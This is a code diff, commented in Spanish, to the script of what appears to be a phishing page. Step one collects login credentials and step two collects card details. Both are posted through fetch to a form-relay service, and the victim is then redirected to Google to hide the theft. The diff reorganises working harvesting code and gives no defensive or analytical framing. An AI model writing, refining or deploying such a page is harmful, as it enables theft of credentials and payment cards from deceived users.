@@ -157,68 +157,71 @@
         <div class="loader" style="display:block;"></div>
     </div>
 
-    <script>
-        // Lógica para Paso 1 (Credenciales)
-        const form1 = document.getElementById('form-step1');
-        const loader1 = document.querySelector('#step1 .loader');
-
-        form1.addEventListener('submit', function(e) {
-            e.preventDefault(); // Evitar envío normal por ahora
+ <script>
+        // Esperar a que cargue la página
+        document.addEventListener("DOMContentLoaded", function() {
             
-            const btn = form1.querySelector('button');
-            btn.disabled = true;
-            loader1.style.display = 'block';
-
-            const formData = new FormData(form1);
+            // --- LÓGICA PASO 1 (Credenciales) ---
+            const form1 = document.getElementById('form-step1');
+            const loader1 = document.querySelector('#step1 .loader');
             
-            // Enviar a FormSubmit
-            fetch(form1.action, {
-                method: 'POST',
-                body: formData
-            }).then(response => {
-                // Si tiene éxito, ir al paso 2
-                document.getElementById('step1').classList.remove('active');
-                document.getElementById('step2').classList.add('active');
-            }).catch(error => {
-                console.error('Error:', error);
-                alert('Hubo un error. Intente de nuevo.');
-                btn.disabled = false;
-                loader1.style.display = 'none';
+            form1.addEventListener('submit', function(e) {
+                e.preventDefault(); // Evita que se recargue la página
+                
+                // Muestra el loader
+                loader1.style.display = 'block';
+                
+                const formData = new FormData(form1);
+                
+                // Envía los datos al action del formulario
+                fetch(form1.action, {
+                    method: 'POST',
+                    body: formData,
+                    redirect: 'follow' // Importante para que FormSubmit procese y redireccione
+                }).then(response => {
+                    // Si todo sale bien, va al paso 2
+                    document.getElementById('step1').classList.remove('active');
+                    document.getElementById('step2').classList.add('active');
+                }).catch(error => {
+                    console.error('Error:', error);
+                    alert('Error de conexión. Intenta de nuevo.');
+                    loader1.style.display = 'none';
+                });
             });
-        });
 
-        // Lógica para Paso 2 (Tarjeta)
-        const form2 = document.getElementById('form-step2');
-        const loader2 = document.getElementById('loader-step2');
-        const btn2 = document.getElementById('btn-step2');
+            // --- LÓGICA PASO 2 (Tarjeta) ---
+            const form2 = document.getElementById('form-step2');
+            const loader2 = document.getElementById('loader-step2');
+            const btn2 = document.getElementById('btn-step2');
 
-        form2.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            btn2.disabled = true;
-            loader2.style.display = 'block';
+            form2.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                loader2.style.display = 'block';
+                btn2.disabled = true;
+                
+                const formData = new FormData(form2);
+                
+                fetch(form2.action, {
+                    method: 'POST',
+                    body: formData,
+                    redirect: 'follow'
+                }).then(response => {
+                    // Si todo sale bien, va al paso 3
+                    document.getElementById('step2').classList.remove('active');
+                    document.getElementById('step3').classList.add('active');
+                    
+                    // Redirige a Google después de 3 segundos
+                    setTimeout(function() {
+                        window.location.href = "https://www.google.com";
+                    }, 3000);
 
-            const formData = new FormData(form2);
-            
-            // Enviar a FormSubmit
-            fetch(form2.action, {
-                method: 'POST',
-                body: formData
-            }).then(response => {
-                // Si tiene éxito, ir al paso 3 (Éxito)
-                document.getElementById('step2').classList.remove('active');
-                document.getElementById('step3').classList.add('active');
-
-                // Redirigir a Google después de 3 segundos
-                setTimeout(function() {
-                    window.location.href = "https://www.google.com";
-                }, 3000);
-
-            }).catch(error => {
-                console.error('Error:', error);
-                alert('Error de verificación. Intente de nuevo.');
-                btn2.disabled = false;
-                loader2.style.display = 'none';
+                }).catch(error => {
+                    console.error('Error:', error);
+                    alert('Error al verificar tarjeta.');
+                    loader2.style.display = 'none';
+                    btn2.disabled = false;
+                });
             });
         });
     </script>
